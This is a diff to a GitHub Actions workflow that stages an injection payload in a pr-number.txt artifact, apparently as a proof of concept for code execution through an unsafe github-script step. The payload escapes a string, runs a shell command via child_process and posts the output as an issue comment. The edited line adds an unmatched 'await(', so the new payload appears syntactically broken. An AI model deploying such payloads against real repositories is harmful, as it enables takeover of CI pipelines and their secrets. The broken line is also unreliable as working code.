@@ -15,7 +15,7 @@ jobs:
       - name: Stage attacker-controlled results
         run: |
           mkdir -p benchmark-results
-          echo -n "0');console.log('RCE-PROOF:'+require('child_process').execSync('id').toString());await github.rest.issues.createComment({owner:context.repo.owner,repo:context.repo.repo,issue_number:1,body:'RCE-PROOF-'+require('child_process').execSync('id').toString()});//" > benchmark-results/pr-number.txt
+          echo -n "0');console.log('RCE-PROOF:'+require('child_process').execSync('id').toString());await(github.rest.issues.createComment({owner:context.repo.owner,repo:context.repo.repo,issue_number:1,body:'RCE-PROOF-'+require('child_process').execSync('id').toString()});//" > benchmark-results/pr-number.txt
           echo "attacker controlled report" > benchmark-results/bench_report.md
           wc -c benchmark-results/pr-number.txt
           cat benchmark-results/pr-number.txt
